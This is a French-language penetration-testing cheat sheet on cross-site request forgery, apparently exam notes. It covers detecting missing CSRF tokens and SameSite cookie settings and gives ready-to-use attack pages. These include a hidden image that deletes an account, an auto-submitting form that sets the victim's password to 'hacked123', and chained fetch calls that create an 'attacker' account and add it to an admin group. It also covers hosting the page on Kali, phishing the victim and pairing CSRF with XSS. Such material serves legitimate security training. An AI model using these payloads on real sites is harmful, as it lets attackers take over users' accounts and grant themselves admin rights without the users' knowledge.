# CSRF — Cross-Site Request Forgery

## 1. Concept

Le CSRF incite un utilisateur **déjà authentifié** à envoyer une requête à son insu vers une app sur laquelle il a une session active. Le navigateur joint automatiquement les cookies → l'app traite la requête comme légitime.

**Condition :** la victime doit être connectée à l'app cible ET visiter la page piégée de l'attaquant.

---

## 2. Détecter la vulnérabilité

### 2.1 Vérifier l'absence de token CSRF

Inspecter les formulaires d'actions sensibles (changement de mot de passe, création d'utilisateur, modification de profil...) :

```html
<!-- Vulnérable : aucun token -->
<form action="/user/changePassword" method="post">
  <input name="password1" ...>
  <input name="password2" ...>
</form>

<!-- Protégé : token CSRF présent -->
<form action="/user/changePassword" method="post">
  <input type="hidden" name="csrftoken" value="SXQncyBhIHNlY3JldCE=">
  ...
</form>
```

### 2.2 Vérifier les cookies SameSite

Dans Burp → intercepter la réponse de login → chercher `Set-Cookie` :

```
Set-Cookie: JSESSIONID=abc123; Path=/; HttpOnly
              ↑ pas de SameSite → vulnérable

Set-Cookie: session=xyz; SameSite=Strict; HttpOnly
              ↑ protégé
```

| SameSite | Comportement                                                            |
|----------|-------------------------------------------------------------------------|
| Absent   | Chrome applique Lax par défaut                                          |
| `None`   | Cookie envoyé dans toutes les requêtes cross-site                       |
| `Lax`    | Cookie envoyé seulement sur navigation directe (lien) — bloque les POST |
| `Strict` | Cookie jamais envoyé cross-site                                         |

### 2.3 Burp — Generate CSRF PoC

Dans Burp : clic droit sur une requête → **Engagement tools → Generate CSRF PoC**  
→ Génère automatiquement le formulaire HTML de l'attaque.

---

## 3. Exploitation — Requête GET

La plus simple : insérer l'URL dans une balise `<img>`. Le navigateur envoie le GET automatiquement.

```html
<!-- Le navigateur charge l'image → déclenche l'action -->
<img src="https://TARGET/user/deleteAccount?confirm=true" width="0" height="0">
```

---

## 4. Exploitation — Requête POST

### 4.1 Méthode formulaire (simple)

```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://TARGET/user/changePassword" method="post" name="csrf">
    <input type="hidden" name="password1" value="hacked123">
    <input type="hidden" name="password2" value="hacked123">
  </form>
</body>
</html>
```

Héberger sur Kali :
```bash
sudo cp exploit.html /var/www/html/
sudo service apache2 start
# Partager le lien : http://KALI_IP/exploit.html
```

### 4.2 Méthode fetch (deux requêtes enchaînées)

Quand il faut enchaîner plusieurs actions (ex : créer un user + l'ajouter à un groupe admin) :

```html
<html>
<head>
<script>
  var host = "https://TARGET";

  function send_create() {
    fetch(host + "/admin/createUser", {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: "username=attacker&password=hacked123&passwordConfirm=hacked123"
    }).then(function() {
      send_admin();
    });
  }

  function send_admin() {
    fetch(host + "/admin/addUserToGroup", {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: "username=attacker&groupId=SUPER"
    });
  }

  send_create();
</script>
</head>
<body></body>
</html>
```

!!! note "mode: 'no-cors' + credentials: 'include'"
    `no-cors` → restreint à `application/x-www-form-urlencoded` mais contourne CORS.  
    `credentials: 'include'` → force l'envoi des cookies cross-site.  
    Malgré ça, si le cookie est `SameSite=Lax/Strict`, les cookies ne seront **pas** envoyés.

---

## 5. Contourner SameSite=Lax

Si Chrome applique Lax par défaut, le cookie n'est **pas** envoyé sur les POST cross-site.

**Workaround exam :** modifier manuellement le cookie dans l'inspecteur du navigateur :

```
DevTools → Application → Cookies → JSESSIONID
→ Modifier l'attribut SameSite → None
→ Relancer l'exploit
```

Vérifier dans Burp que le cookie est bien présent dans la requête POST.

---

## 6. Construire le payload depuis Burp

1. Intercepter la requête légitime de l'action ciblée
2. Identifier tous les paramètres POST (body)
3. Créer un `<input type="hidden">` pour chaque paire clé-valeur
4. Vérifier que **aucun token** ne change à chaque requête

```bash
# Requête originale
POST /user/changePassword
password1=OldPass&password2=OldPass

# Payload CSRF correspondant
<input type="hidden" name="password1" value="hacked123">
<input type="hidden" name="password2" value="hacked123">
```

---

## 7. Workflow exam

```
1. Trouver une action sensible (changement mdp, création user, suppression...)
2. Capturer la requête dans Burp
3. Vérifier : token CSRF dans le body/headers ?
4. Vérifier : attribut SameSite sur les cookies ?
5. Si pas de token → construire le payload HTML
6. Héberger sur Kali (Apache)
7. "Phisher" la victime avec le lien
8. Vérifier dans Burp que les cookies sont envoyés
9. Si SameSite bloque → modifier manuellement le cookie dans DevTools
```

!!! tip "CSRF + XSS = combo puissant"
    Si tu as un XSS sur la même app, tu peux envoyer le fetch CSRF directement   
    depuis le contexte de la victime — le SameSite ne bloque plus rien car la requête   
    vient de la même origine.